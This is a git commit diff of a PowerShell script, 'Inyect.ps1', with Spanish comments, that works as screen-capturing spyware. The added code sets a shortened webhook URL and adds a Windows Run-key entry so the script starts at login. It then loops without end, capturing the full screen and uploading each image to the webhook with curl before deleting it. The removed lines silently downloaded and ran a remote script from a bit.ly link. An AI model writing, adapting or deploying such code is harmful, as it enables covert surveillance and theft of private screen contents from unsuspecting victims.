d5eae5b7678d652a93146f36cbee71f9d902b98d
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-10 23:00:44 -0500

    Update Inyect.ps1

--- Inyect.ps1
+++ Inyect.ps1
@@ -1,9 +1,33 @@
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
+$hookurl = "https://bit.ly/chu_kbras"
+$seconds = 30 # Intervalo entre capturas
+$a = 1 # Cantidad de capturas
 
-$scriptUrl = "https://bit.ly/Screen_dc"
-$scriptPath = "$env:temp\capture_script.ps1"
-Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
-Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File $scriptPath"
+# Detección de URL acortada
+if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected..000." ; $hookurl = (irm $hookurl).url}
 
+# Ubicación del script
+$scriptPath = $MyInvocation.MyCommand.Path
+
+# Agregar entrada al registro de Windows para iniciar con el sistema
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "sysw2" -Value "powershell.exe -WindowStyle Hidden -File $scriptPath"
+Set-ItemProperty -Path $regPath -Name "ScreenshotScript" -Value $scriptPath
+
+do {
+    $Filett = "$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@$filett" $hookurl
+    Start-Sleep 1
+    Remove-Item -Path $filett
+    Start-Sleep $seconds
+} while ($true)
